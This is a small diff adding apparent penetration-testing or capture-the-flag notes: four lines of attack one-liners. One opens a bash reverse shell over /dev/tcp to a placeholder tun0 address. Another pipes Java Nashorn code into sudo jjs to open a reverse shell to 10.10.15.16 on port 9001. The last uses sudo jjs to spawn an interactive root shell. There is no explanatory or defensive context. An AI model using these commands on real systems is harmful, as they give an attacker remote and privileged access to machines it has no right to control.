@@ -1,0 +1,4 @@
+bash -c 'bash -i >& /dev/tcp/<if config tun0>/port 0>&1'
+echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.16/9001 0>&1').waitFor()" | sudo jjs
+
+echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo jjs
